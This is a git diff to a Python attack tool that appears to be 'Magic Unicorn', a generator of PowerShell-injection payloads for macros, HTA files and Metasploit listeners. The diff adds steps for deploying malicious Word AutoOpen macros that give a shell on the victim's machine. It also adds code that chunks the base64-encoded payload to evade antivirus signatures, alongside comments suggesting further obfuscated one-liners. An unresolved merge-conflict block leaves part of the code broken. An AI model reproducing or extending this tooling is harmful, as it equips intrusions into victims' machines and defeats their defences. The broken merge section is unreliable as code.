@@ -100,6 +100,13 @@ is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! 
 victim to thinking the excel document is corrupted. You should get a shell through powershell injection
 after that.
 
+If you are deploying this against Office365/2016+ versions of Word you need to modify the first line of 
+the output from: Sub Auto_Open()
+ 
+To: Sub AutoOpen()
+ 
+The name of the macro itself must also be "AutoOpen" instead of the legacy "Auto_Open" naming scheme.
+
 NOTE: WHEN COPYING AND PASTING THE EXCEL, IF THERE ARE ADDITIONAL SPACES THAT ARE ADDED YOU NEED TO
 REMOVE THESE AFTER EACH OF THE POWERSHELL CODE SECTIONS UNDER VARIABLE "x" OR A SYNTAX ERROR WILL
 HAPPEN!
@@ -196,7 +203,7 @@ The last one will use a 500 character string instead of the default 380, resulti
 # usage banner
 def gen_usage():
     print(
-        "-------------------- Magic Unicorn Attack Vector v2.6 -----------------------------")
+        "-------------------- Magic Unicorn Attack Vector v2.6.1 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print(
         "Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
@@ -485,15 +492,29 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
     print("Twitter: @TrustedSec, @HackingDave")
     print("\nHappy Magic Unicorns.")
 
-    ran1 = generate_random_string(1, 3)
-    ran2 = generate_random_string(1, 3)
-    ran3 = generate_random_string(1, 3)
-    ran4 = generate_random_string(1, 3)
+    ran1 = generate_random_string(2, 5)
+    ran2 = generate_random_string(2, 5)
+    ran3 = generate_random_string(2, 5)
+    ran4 = generate_random_string(2, 5)
+
+    # honestly anti-virus is one of the most annoying programs ever created - it has nothing to do with security, but if something becomes popular, lets write a signature that annoys the author. So in this example, we say F A/V because it's literally terrible. What AV - i.e. Kaspersky in this case was doing was evaluating the base64 encoded command - so what do we do? Chunk it up because anti-virus is absolutely ridiculous. Of course this gets around it because it doesn't know how to interpret PowerShell. Instead, what you need to be looking for is long powershell statements, toString() as suspicious, etc. That'll never happen because A/V is suppose to be signature based on something they can catch. You all literally are a dying breed. Sorry for the rant, but it's annoying to have to sit here and rewrite stupid stuff because your wrote a shitty sig. -Dave
+    fuckav = base64.b64encode(powershell_code.encode('utf_16_le'))
+    # [paragraph[i: i + x] for i in range(0, len(paragraph), x)]
+    avsux = randomint = random.randint(90,100)
+    avnotftw = [fuckav[i: i + avsux] for i in range(0, len(fuckav), avsux)]
+    haha_av = ""
+    counter = 0
+    for non_signature in avnotftw:
+        non_signature = non_signature.rstrip()
+        if counter > 0: haha_av = haha_av + "+"
+        if counter > 0: haha_av = haha_av + "'" 
+        surprise_surprise = non_signature + "'"
+        haha_av = haha_av + surprise_surprise #ThisShouldKeepMattHappy
+        counter = 1
 
     # powershell -w 1 -C "powershell ([char]45+[char]101+[char]99) YwBhAGwAYwA="  <-- Another nasty one that should evade. If you are reading the source, feel free to use and tweak
     #"sv x -;sv y ec;sv Z ((gv x).value.toString()+(gv y).value.toString());powershell (gv Z).value.toString()"
-    full_attack = 'powershell -w 1 -C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() \''.format(ran1, ran2, ran3, ran1, ran2, ran3) + \
-        base64.b64encode(powershell_code.encode('utf_16_le')) + '\'"'
+    full_attack = 'powershell -w 1 -C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
 
     if attack_type == "msf":
         if attack_modifier == "macro":
@@ -526,15 +547,19 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
 
     # Print completion messages
     if attack_type == "msf" and attack_modifier == "hta":
+<<<<<<< HEAD
+        print("[*] Exported index.html, Launcher.hta, and unicorn.rc under hta_attack/.")
+        print("[*] Run msfconsole -r unicorn.rc to launch listener and move index and launcher to web server.\n")
+=======
         print(
             "[*] Exported index.html, Launcher.hta, and unicorn.rc under hta_attack/.")
         print(
             "[*] Run msfconsole -r unicorn.rc to launch listener and move index and launcher to web server.\n")
+>>>>>>> cb8f7c25052c0c8f807efb1fd9f78a2bb653353e
 
     elif attack_type == "msf":
         print("[*] Exported powershell output code to powershell_attack.txt.")
-        print(
-            "[*] Exported Metasploit RC file as unicorn.rc. Run msfconsole -r unicorn.rc to execute and create listener.\n")
+        print("[*] Exported Metasploit RC file as unicorn.rc. Run msfconsole -r unicorn.rc to execute and create listener.\n")
 
     elif attack_type == "custom_ps1":
         print("[*] Exported powershell output code to powershell_attack.txt")
